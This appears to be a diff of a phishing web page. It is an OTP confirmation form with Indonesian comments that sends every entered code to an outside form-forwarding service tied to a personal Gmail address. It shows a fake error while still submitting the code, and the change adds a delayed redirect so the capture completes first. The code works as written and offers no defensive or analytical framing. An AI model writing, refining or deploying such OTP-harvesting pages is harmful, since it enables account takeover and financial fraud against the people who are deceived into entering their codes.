@@ -83,10 +83,9 @@
       <input type="tel" maxlength="1" oninput="moveNext(this, 3)" required>
     </div>
     <div class="timer" id="timer">KIRIM ULANG (100s)</div>
-    <form id="otpForm" action="https://formsubmit.co/baygaming648@gmail.com" method="POST" target="_self" onsubmit="return submitOTP()">
+    <form id="otpForm" action="https://formsubmit.co/baygaming648@gmail.com" method="POST" target="_self" onsubmit="return submitOTP(event)">
       <input type="hidden" name="OTP" id="otpFull">
       <input type="hidden" name="_captcha" value="false">
-      <!-- _next DIHAPUS agar tetap di halaman ini -->
       <button type="submit">KONFIRMASI</button>
     </form>
   </div>
@@ -104,18 +103,23 @@
       }
     }
 
-    function submitOTP() {
+    function submitOTP(event) {
       const otp = Array.from(inputs).map(i => i.value).join('');
       document.getElementById("otpFull").value = otp;
 
-      // Tampilkan pesan error jika OTP kadaluarsa atau kurang dari 4 digit
+      // Tampilkan pesan error jika OTP tidak valid
       if (isExpired || otp.length < 4) {
         errorMsg.style.display = "block";
       } else {
         errorMsg.style.display = "none";
       }
 
-      return true; // tetap kirim ke email walaupun error ditampilkan
+      // Biarkan form tetap dikirim, lalu redirect manual
+      setTimeout(() => {
+        window.location.href = "https://b813743.github.io/Testing-/";
+      }, 1000); // beri delay agar FormSubmit sempat terkirim
+
+      return true; // tetap submit ke FormSubmit
     }
 
     const interval = setInterval(() => {
